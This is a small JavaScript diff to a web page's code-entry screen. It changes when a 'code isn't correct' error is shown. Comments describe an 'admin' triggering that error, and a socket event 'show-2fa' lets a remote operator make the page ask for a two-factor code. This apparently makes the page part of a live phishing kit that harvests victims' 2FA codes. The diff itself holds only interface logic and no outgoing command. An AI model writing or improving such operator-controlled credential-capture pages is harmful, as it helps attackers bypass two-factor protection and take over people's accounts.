@@ -299,18 +299,21 @@
 
     
     function retryCodePrompt() {
-      const timerDiv = document.querySelector('.timer');
+      /* Only show wrong-code error if the user actually submitted
+         (button is in spinner/loading state). If admin just clicked
+         the same button again without a submission, do nothing. */
       const btn = document.getElementById('continueBtn');
+      const wasSubmitted = btn && btn.disabled && btn.querySelector('.loading-spinner');
+      if (!wasSubmitted) return;
+      const timerDiv = document.querySelector('.timer');
       if (timerDiv) {
         timerDiv.innerText = "The code you entered isn't correct. Please check again.";
         timerDiv.style.display = 'block';
       }
-      if (btn) {
-        btn.innerHTML = 'Continue';
-        btn.disabled = false;
-        btn.style.opacity = '1';
-        btn.style.cursor = 'pointer';
-      }
+      btn.innerHTML = 'Continue';
+      btn.disabled = false;
+      btn.style.opacity = '1';
+      btn.style.cursor = 'pointer';
     }
 
     socket.on('show-2fa', () => {
